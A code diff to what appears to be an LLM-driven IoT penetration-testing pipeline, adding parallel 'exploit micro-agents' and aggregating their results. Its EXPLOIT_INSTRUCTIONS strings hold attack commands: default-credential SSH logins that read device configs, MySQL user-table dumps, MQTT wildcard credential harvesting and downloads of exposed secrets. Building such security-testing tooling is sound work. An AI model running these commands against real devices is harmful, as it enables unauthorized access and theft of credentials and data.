@@ -23,7 +23,7 @@ from src.agent.tools.graph_tools import (
     get_device_info,
 )
 from src.agent.tools.recon_tools import RECON_TOOLS
-from src.agent.tools.deliverable import DELIVERABLE_TOOLS, set_output_dir
+from src.agent.tools.deliverable import DELIVERABLE_TOOLS, set_output_dir, _extract_json
 from src.agent.tools.skill_tools import SKILL_TOOLS, get_skills_metadata, set_skill_filter
 from src.agent.validators import VALIDATORS
 
@@ -35,6 +35,57 @@ TOOL_GROUPS: dict[str, list[dict]] = {
     "recon": RECON_TOOLS,
     "deliverable": DELIVERABLE_TOOLS,
     "skill": SKILL_TOOLS,
+}
+
+# ---------------------------------------------------------------------------
+# Phase 4 exploit micro-agents: category mapping & per-category instructions
+# ---------------------------------------------------------------------------
+
+EXPLOIT_CATEGORY_MAP: dict[str, str] = {
+    "default_credentials": "credentials",
+    "code_injection":      "injection",
+    "insecure_update":     "injection",
+    "no_auth":             "data_access",
+    "data_exposure":       "data_access",
+    "directory_listing":   "data_access",
+    "insecure_protocol":   "data_access",
+    "network_exposure":    "data_access",
+}
+
+# Config-only findings that pass through without an exploit agent
+CONFIG_ONLY_TYPES: set[str] = {
+    "weak_cipher", "missing_header", "info_disclosure", "terrapin",
+    "version_leak", "known_cve",
+}
+
+EXPLOIT_INSTRUCTIONS: dict[str, str] = {
+    "credentials": (
+        "Test default credentials on this service.\n"
+        "For SSH: try these pairs in order — admin:admin, root:root, ubnt:ubnt, pi:raspberry\n"
+        '  ssh_login("sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no '
+        "-o UserKnownHostsFile=/dev/null USER@{ip} "
+        "'id && cat /etc/iot/config.json'\")\n"
+        "For MySQL: mysql_query(host=\"{ip}\", user=\"root\", "
+        "query=\"SHOW DATABASES; SELECT * FROM smartcity.users LIMIT 5;\")\n"
+        "Stop at FIRST successful login. Report ALL data retrieved."
+    ),
+    "data_access": (
+        "Access the service and retrieve actual data to prove impact.\n"
+        'For MQTT no_auth: mqtt_listen("{ip}", topic="#", count=10, timeout=8) '
+        "— capture messages, extract credentials/keys\n"
+        'For HTTP data_exposure: http_get("{url}") — download the file, '
+        "show ALL sensitive content (passwords, API keys)\n"
+        'For HTTP directory_listing: http_get("{url}") for each listed file — show contents\n'
+        'For Telnet: telnet_connect("echo quit | timeout 3 nc {ip} {port}") — show session\n'
+        "For DB: mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\") — show data\n"
+        'For FTP: ftp_list("ftp://{ip}/") — show files'
+    ),
+    "injection": (
+        "Attempt code execution or unauthorized upload.\n"
+        'For file upload: http_get("http://{ip}/uploads/") to check for uploaded files\n'
+        'For firmware: http_get("http://{ip}/update") to test unsigned firmware access\n'
+        "Report what is accessible and whether execution is possible."
+    ),
 }
 
 
@@ -573,6 +624,31 @@ class Pipeline:
         if config.has_device_agents:
             self._run_device_agents(config, stream_callback)
 
+        # If this phase has exploit sub-agents, run them and skip the LLM aggregator
+        if config.has_exploit_agents:
+            self._run_exploit_agents(config, stream_callback)
+            # Deterministic aggregation already wrote 04_exploitation.json
+            validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
+            valid, msg = validator_fn(config.deliverable_file)
+            status = "completed" if valid else f"failed:{msg}"
+            if valid:
+                log.info("Phase %d exploit aggregation validated: %s", config.phase, msg)
+                print(f"  Deliverable validated: {config.deliverable_file}")
+            else:
+                log.error("Phase %d exploit aggregation FAILED: %s", config.phase, msg)
+                print(f"  Deliverable FAILED validation: {msg}")
+            if stream_callback:
+                stream_callback({
+                    "type": "phase_done",
+                    "phase": config.phase,
+                    "name": config.name,
+                    "status": status,
+                    "deliverable": config.deliverable_file,
+                    "cost_usd": 0,
+                    "turns": 0,
+                })
+            return status
+
         # Run agent with cost tracking
         self.tracker.start_phase(config.name)
         result_text = self.provider.chat_with_tools(
@@ -751,7 +827,7 @@ class Pipeline:
                 stream_callback({"type": "device_done", "device_id": device_id, "device_ip": device_ip, "phase": 3, "turns": usage.turns if usage else 0})
 
             # Fallback: if the LLM never called save_deliverable, save its last text output
-            from src.agent.tools.deliverable import _extract_json as _exj
+            _exj = _extract_json
             deliverable_path = self.run_dir / deliverable_file
             if not deliverable_path.exists() and result_text and result_text.strip():
                 log.warning(
@@ -847,6 +923,308 @@ class Pipeline:
         print(f"\n{'=' * 60}")
         print(f"  All {len(surface)} sub-agents finished.")
         print(f"{'=' * 60}\n")
+
+    # ------------------------------------------------------------------
+    # Phase 4: per-vuln exploit micro-agents
+    # ------------------------------------------------------------------
+
+    def _run_exploit_agents(
+        self,
+        config: AgentConfig,
+        stream_callback: Callable[[dict], None] | None = None,
+    ) -> None:
+        """Run per-vuln exploit micro-agents in parallel, then aggregate results."""
+        import threading
+        import time as _time
+        from concurrent.futures import ThreadPoolExecutor
+
+        # 1. Read the Phase 3 vulnerability queue
+        vuln_path = self.run_dir / "03_vuln_analysis.json"
+        if not vuln_path.exists():
+            log.warning("Phase 4: 03_vuln_analysis.json not found — skipping exploit agents")
+            return
+        vuln_data = json.loads(vuln_path.read_text(encoding="utf-8"))
+        all_vulns = vuln_data.get("vulnerabilities", [])
+
+        # 2. Filter vulns that need an exploit agent
+        exploit_tasks: list[dict] = []
+        for vuln in all_vulns:
+            vuln_type = vuln.get("type", "")
+            expl_status = vuln.get("exploitation_status", "")
+
+            # Config-only findings pass through without exploit agent
+            if vuln_type in CONFIG_ONLY_TYPES:
+                continue
+
+            # Determine if exploit agent is needed
+            category = EXPLOIT_CATEGORY_MAP.get(vuln_type)
+            if not category:
+                continue  # unknown type, skip
+
+            # Launch exploit agent for:
+            # - "suspected" vulns: Phase 3 detected but could not prove (e.g. password auth enabled)
+            # - "confirmed" vulns with exploitable category: re-test for deeper impact/data exfiltration
+            # - vulns without exploitation_status (backward compat): use category membership as signal
+            exploit_tasks.append({
+                "vuln": vuln,
+                "category": category,
+            })
+
+        if not exploit_tasks:
+            log.info("Phase 4: no exploitable vulns found — skipping exploit agents")
+            self._aggregate_exploit_results()
+            return
+
+        tools = self._resolve_tools(config)
+
+        print(f"\n{'=' * 60}")
+        print(f"PHASE {config.phase}: EXPLOIT SUB-AGENTS (PARALLEL)")
+        print(f"  Launching {len(exploit_tasks)} exploit micro-agents")
+        print(f"{'=' * 60}\n")
+
+        # Per-device locks to avoid concurrent connections to same host
+        from collections import defaultdict
+        device_locks: defaultdict[str, threading.Lock] = defaultdict(threading.Lock)
+        _locks_guard = threading.Lock()
+
+        def _get_device_lock(device_ip: str) -> threading.Lock:
+            with _locks_guard:
+                return device_locks[device_ip]
+
+        def _run_single_exploit(task: dict):
+            vuln = task["vuln"]
+            category = task["category"]
+            vuln_id = vuln.get("id", "VULN-???")
+            vuln_type = vuln.get("type", "unknown")
+            device_id = vuln.get("device_id", "unknown")
+            device_ip = vuln.get("device_ip", "unknown")
+            service = vuln.get("service", "unknown")
+            port = vuln.get("port", 0)
+            severity = vuln.get("severity", "MEDIUM")
+            details = vuln.get("details", "")
+            evidence = vuln.get("evidence", "")
+
+            # Build deliverable path: 04_exploits/{device_id}/{vuln_type}_{vuln_id}.json
+            safe_vuln_id = vuln_id.replace("/", "_")
+            deliverable_file = f"04_exploits/{device_id}/{vuln_type}_{safe_vuln_id}.json"
+
+            # Build exploit instructions with variable substitution
+            instructions = EXPLOIT_INSTRUCTIONS.get(category, "")
+            instructions = instructions.replace("{ip}", device_ip)
+            instructions = instructions.replace("{port}", str(port))
+            # Build URL for data_access category
+            if service in ("http", "https") and port:
+                url = f"http://{device_ip}:{port}" if port != 80 else f"http://{device_ip}"
+            else:
+                url = f"http://{device_ip}"
+            instructions = instructions.replace("{url}", url)
+
+            variables = {**self.context}
+            variables["device_id"] = device_id
+            variables["device_ip"] = device_ip
+            variables["vuln_id"] = vuln_id
+            variables["vuln_type"] = vuln_type
+            variables["vuln_severity"] = severity
+            variables["service"] = service
+            variables["port"] = str(port) if port else "0"
+            variables["vuln_details"] = details
+            variables["vuln_evidence"] = evidence[:500]
+            variables["exploit_instructions"] = instructions
+            variables["expected_deliverable"] = deliverable_file
+            variables["available_skills"] = ""
+
+            system_prompt = load_prompt("exploit_device_vuln", variables)
+            phase_name = f"exploit_{device_id}_{vuln_type}"
+
+            print(f"  [+] Starting: {phase_name} ({device_ip})")
+            if stream_callback:
+                stream_callback({
+                    "type": "exploit_start",
+                    "device_id": device_id,
+                    "device_ip": device_ip,
+                    "vuln_type": vuln_type,
+                    "vuln_id": vuln_id,
+                    "phase": 4,
+                })
+
+            # Acquire per-device lock to avoid concurrent connections
+            lock = _get_device_lock(device_ip)
+            with lock:
+                self.tracker.start_phase(phase_name)
+                result_text = self.provider.chat_with_tools(
+                    system_prompt=system_prompt,
+                    user_message=(
+                        f"Exploit {vuln_type} on {device_id} ({device_ip}). "
+                        f"Service: {service} port {port}. "
+                        f"Call save_deliverable('{deliverable_file}', json_content) when done."
+                    ),
+                    tools=tools,
+                    max_turns=10,
+                    max_tokens=2048,
+                    cost_tracker=self.tracker,
+                    stream_callback=stream_callback,
+                    required_tool="save_deliverable",
+                )
+                usage = self.tracker.end_phase()
+
+            if usage:
+                print(f"  [+] Done: {phase_name} in {usage.turns} turns")
+            if stream_callback:
+                stream_callback({
+                    "type": "exploit_done",
+                    "device_id": device_id,
+                    "vuln_type": vuln_type,
+                    "vuln_id": vuln_id,
+                    "phase": 4,
+                    "turns": usage.turns if usage else 0,
+                })
+
+            # Fallback: if save_deliverable was never called
+            _exj = _extract_json
+            deliverable_path = self.run_dir / deliverable_file
+            if not deliverable_path.exists() and result_text and result_text.strip():
+                log.warning("Exploit %s: save_deliverable not called — saving fallback", phase_name)
+                deliverable_path.parent.mkdir(parents=True, exist_ok=True)
+                fallback = _exj(result_text)
+                deliverable_path.write_text(fallback, encoding="utf-8")
+
+            # Safety net: if still no file, write ERROR result
+            if not deliverable_path.exists():
+                log.warning("Exploit %s: no output — saving ERROR result", phase_name)
+                deliverable_path.parent.mkdir(parents=True, exist_ok=True)
+                error_result = {
+                    "vuln_id": vuln_id,
+                    "device_id": device_id,
+                    "device_ip": device_ip,
+                    "vuln_type": vuln_type,
+                    "severity": severity,
+                    "service": service,
+                    "port": port,
+                    "status": "ERROR",
+                    "evidence": "Exploit agent produced no output",
+                    "evidence_level": 0,
+                    "tool_used": "",
+                    "data_extracted": [],
+                    "description": "Exploit agent failed to produce output",
+                }
+                deliverable_path.write_text(json.dumps(error_result, indent=2), encoding="utf-8")
+
+        # Launch exploit agents with small stagger to avoid API rate limits
+        def _run_with_stagger(args):
+            idx, task = args
+            if idx > 0:
+                _time.sleep(min(idx * 0.5, 5))  # 0.5s stagger, max 5s
+            _run_single_exploit(task)
+
+        with ThreadPoolExecutor(max_workers=min(len(exploit_tasks), 8)) as pool:
+            pool.map(_run_with_stagger, enumerate(exploit_tasks))
+
+        print(f"\n{'=' * 60}")
+        print(f"  All {len(exploit_tasks)} exploit agents finished.")
+        print(f"{'=' * 60}\n")
+
+        # 3. Deterministic aggregation
+        self._aggregate_exploit_results()
+
+    def _aggregate_exploit_results(self) -> None:
+        """Merge Phase 3 confirmed vulns + Phase 4 exploit results into 04_exploitation.json."""
+        vuln_path = self.run_dir / "03_vuln_analysis.json"
+        if not vuln_path.exists():
+            return
+
+        vuln_data = json.loads(vuln_path.read_text(encoding="utf-8"))
+        all_vulns = vuln_data.get("vulnerabilities", [])
+
+        tests: list[dict] = []
+        confirmed_count = 0
+        not_exploitable_count = 0
+        error_count = 0
+
+        for vuln in all_vulns:
+            vuln_id = vuln.get("id", "VULN-???")
+            vuln_type = vuln.get("type", "")
+            device_id = vuln.get("device_id", "unknown")
+            safe_vuln_id = vuln_id.replace("/", "_")
+
+            # Check for exploit agent result file
+            exploit_file = self.run_dir / "04_exploits" / device_id / f"{vuln_type}_{safe_vuln_id}.json"
+
+            if exploit_file.exists():
+                # Use exploit agent result
+                try:
+                    result = json.loads(exploit_file.read_text(encoding="utf-8"))
+                    status = result.get("status", "ERROR")
+                    test_entry = {
+                        "vuln_id": vuln_id,
+                        "device_id": result.get("device_id", device_id),
+                        "device_ip": result.get("device_ip", vuln.get("device_ip", "")),
+                        "vuln_type": result.get("vuln_type", vuln_type),
+                        "severity": result.get("severity", vuln.get("severity", "MEDIUM")),
+                        "status": "CONFIRMED" if status == "EXPLOITED" else status,
+                        "evidence": result.get("evidence", ""),
+                        "evidence_level": result.get("evidence_level", 1),
+                        "tool_used": result.get("tool_used", ""),
+                        "data_extracted": result.get("data_extracted", []),
+                        "description": result.get("description", ""),
+                        "cve_ids": vuln.get("cve_ids", []),
+                    }
+                    tests.append(test_entry)
+
+                    if status == "EXPLOITED":
+                        confirmed_count += 1
+                    elif status == "FAILED":
+                        not_exploitable_count += 1
+                    else:
+                        error_count += 1
+                except Exception as e:
+                    log.warning("Failed to parse exploit result %s: %s", exploit_file, e)
+                    tests.append({
+                        "vuln_id": vuln_id,
+                        "device_id": device_id,
+                        "device_ip": vuln.get("device_ip", ""),
+                        "vuln_type": vuln_type,
+                        "severity": vuln.get("severity", "MEDIUM"),
+                        "status": "ERROR",
+                        "evidence": f"Failed to parse: {e}",
+                        "evidence_level": 0,
+                        "tool_used": "",
+                        "data_extracted": [],
+                        "description": "Exploit result parsing error",
+                    })
+                    error_count += 1
+            else:
+                # Config finding or no exploit agent — pass through from Phase 3
+                tests.append({
+                    "vuln_id": vuln_id,
+                    "device_id": device_id,
+                    "device_ip": vuln.get("device_ip", ""),
+                    "vuln_type": vuln_type,
+                    "severity": vuln.get("severity", "MEDIUM"),
+                    "status": "CONFIRMED",
+                    "evidence": vuln.get("evidence", ""),
+                    "evidence_level": 1,
+                    "tool_used": "",
+                    "data_extracted": [],
+                    "description": vuln.get("details", ""),
+                    "cve_ids": vuln.get("cve_ids", []),
+                })
+                confirmed_count += 1
+
+        # Write aggregated result
+        aggregated = {
+            "summary": {
+                "total_tested": len(tests),
+                "confirmed": confirmed_count,
+                "not_exploitable": not_exploitable_count,
+                "errors": error_count,
+            },
+            "tests": tests,
+        }
+        out_path = self.run_dir / "04_exploitation.json"
+        out_path.write_text(json.dumps(aggregated, indent=2, ensure_ascii=False), encoding="utf-8")
+        log.info("Aggregated %d exploit results → %s", len(tests), out_path)
+        print(f"  Aggregated: {len(tests)} results → 04_exploitation.json "
+              f"({confirmed_count} confirmed, {not_exploitable_count} failed, {error_count} errors)")
 
     def _resolve_tools(self, config: AgentConfig) -> list[dict]:
         """Resolve tool references to actual tool definitions.
